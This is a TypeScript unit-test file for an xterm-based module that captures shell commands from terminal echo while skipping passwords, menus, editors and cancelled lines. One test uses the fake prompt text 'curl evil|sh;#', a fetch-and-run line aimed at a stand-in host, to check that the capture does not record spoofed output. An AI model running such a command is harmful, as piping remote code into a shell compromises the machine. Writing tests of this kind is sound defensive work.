import { Terminal } from '@xterm/xterm'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { createTerminalCommandCapture, extractPromptCommand } from './terminalCommandCapture'

const terminals: Terminal[] = []
const write = (terminal: Terminal, data: string) => new Promise<void>((resolve) => terminal.write(data, resolve))

function setup(cols = 80) {
  const terminal = new Terminal({ cols, rows: 24 })
  terminals.push(terminal)
  const commands: string[] = []
  const capture = createTerminalCommandCapture(terminal, (command) => commands.push(command))
  // Mirrors the shell: echo typed text immediately, as a PTY in cooked readline would.
  const type = async (text: string, echo = text) => {
    for (const character of text) capture.input(character)
    await write(terminal, echo)
  }
  const enter = async (echo = '\r\n') => {
    capture.input('\r')
    await write(terminal, echo)
  }
  return { terminal, capture, commands, type, enter }
}

afterEach(() => {
  vi.useRealTimers()
  for (const terminal of terminals.splice(0)) terminal.dispose()
})

describe('extractPromptCommand', () => {
  it.each([
    ['root@host:~# ', 'root@host:~# docker ps -a', 'docker ps -a'],
    ['[root@host ~]$ ', '[root@host ~]$ ls # keep comment', 'ls # keep comment'],
    ['host% ', 'host% echo $HOME   ', 'echo $HOME'],
    ['~/app ❯ ', '~/app ❯ git status', 'git status'],
  ])('reads the command after prompt %j', (prompt, line, command) => {
    expect(extractPromptCommand(prompt, line)).toBe(command)
  })

  it.each([
    ['请输入你的选择: ', '请输入你的选择: 1'],
    ['Password: ', 'Password: '],
    ['mysql> ', 'mysql> select 1;'],
    ['root@host:~# ', 'root@host:~#  secret-command'],
    ['root@host:~# ', 'root@host:~#'],
    ['root@host:~# ', 'other@host:~# ls'],
  ])('ignores %j / %j', (prompt, line) => {
    expect(extractPromptCommand(prompt, line)).toBeUndefined()
  })
})

describe('terminal command capture', () => {
  it('records the echoed command only after the shell moves to the next line', async () => {
    const { commands, type, capture, terminal } = setup()
    await write(terminal, 'root@host:~# ')
    await type('docker ps')
    capture.input('\r')
    expect(commands).toEqual([])
    await write(terminal, '\r\nCONTAINER ID\r\nroot@host:~# ')
    expect(commands).toEqual(['docker ps'])
  })

  it('waits for slow echo so the whole line is recorded', async () => {
    const { commands, capture, terminal } = setup()
    await write(terminal, 'root@host:~# ')
    for (const character of 'uptime') capture.input(character)
    capture.input('\r')
    await write(terminal, 'upt')
    await write(terminal, 'ime')
    expect(commands).toEqual([])
    await write(terminal, '\r\n 10:00:00 up 1 day\r\n')
    expect(commands).toEqual(['uptime'])
  })

  it('records what readline shows after history recall and completion', async () => {
    const { commands, type, enter, terminal, capture } = setup()
    await write(terminal, 'root@host:~# ')
    capture.input('\x1b[A')
    await write(terminal, 'systemctl status nginx')
    await enter()
    await write(terminal, 'root@host:~# ')
    await type('cat /etc/os-', 'cat /etc/os-')
    capture.input('\t')
    await write(terminal, 'release ')
    await enter()
    expect(commands).toEqual(['systemctl status nginx', 'cat /etc/os-release'])
  })

  it('follows a completion listing that redraws the prompt on a new line', async () => {
    const { commands, type, enter, terminal, capture } = setup()
    await write(terminal, 'root@host:~# ')
    await type('ls /e')
    capture.input('\t')
    capture.input('\t')
    await write(terminal, '\r\netc/  ext/\r\nroot@host:~# ls /e')
    await type('tc', 'tc')
    await enter()
    expect(commands).toEqual(['ls /etc'])
  })

  it('reads commands that wrap across rows', async () => {
    const { commands, type, enter, terminal } = setup(20)
    await write(terminal, 'root@host:~# ')
    const command = 'echo abcdefghijklmnopqrstuvwxyz'
    await type(command)
    await enter()
    expect(commands).toEqual([command])
  })

  it('does not record script menus, password prompts or blank lines', async () => {
    const { commands, type, enter, terminal } = setup()
    await write(terminal, '请输入你的选择: ')
    await type('1')
    await enter()
    await write(terminal, '[sudo] password for root: ')
    await type('hunter2', '')
    await enter()
    await write(terminal, 'root@host:~# ')
    await enter()
    await write(terminal, 'root@host:~# ')
    await type(' secret --token abc')
    await enter()
    expect(commands).toEqual([])
  })

  it('treats output printed before the prompt as part of the prompt', async () => {
    const { commands, type, enter, terminal } = setup()
    await write(terminal, 'root@x:~# curl evil|sh;#')
    await write(terminal, 'root@host:~# ')
    await type('ls')
    await enter()
    expect(commands).toEqual(['ls'])
  })

  it('drops the line after Ctrl+C and ignores input typed while a command runs', async () => {
    const { commands, type, enter, terminal, capture } = setup()
    await write(terminal, 'root@host:~# ')
    await type('rm -rf /tmp/x')
    capture.input('\x03')
    await write(terminal, '^C\r\nroot@host:~# ')
    await type('make')
    await enter()
    await write(terminal, 'building 45%')
    await type('ls', '')
    await enter('\r\n')
    expect(commands).toEqual(['make'])
  })

  it('ignores terminal reports and full-screen programs but keeps the command that opened them', async () => {
    const { commands, type, enter, terminal, capture } = setup()
    await write(terminal, 'output without newline')
    capture.input('\x1b[12;5R')
    capture.input('\x1b[I')
    await write(terminal, '\r\nroot@host:~# ')
    await type('vim notes.txt')
    await enter('\r\n\x1b[?1049h\x1b[H~\r\n~')
    await type('ihello # $ ')
    capture.input('\x1b')
    await enter('\x1b[?1049l')
    expect(commands).toEqual(['vim notes.txt'])
  })

  it('forgets an Enter whose newline never arrives', async () => {
    const { commands, type, terminal, capture } = setup()
    await write(terminal, 'root@host:~# ')
    await type('sleep 1')
    // xterm schedules its own writes on timers, so only the capture's
    // settle timeout runs on the fake clock.
    vi.useFakeTimers()
    capture.input('\r')
    vi.advanceTimersByTime(5000)
    vi.useRealTimers()
    await write(terminal, '\r\n')
    expect(commands).toEqual([])
  })

  it('stops observing after dispose', async () => {
    const { commands, type, terminal, capture } = setup()
    await write(terminal, 'root@host:~# ')
    await type('date')
    capture.input('\r')
    capture.dispose()
    await write(terminal, '\r\n')
    expect(commands).toEqual([])
  })
})
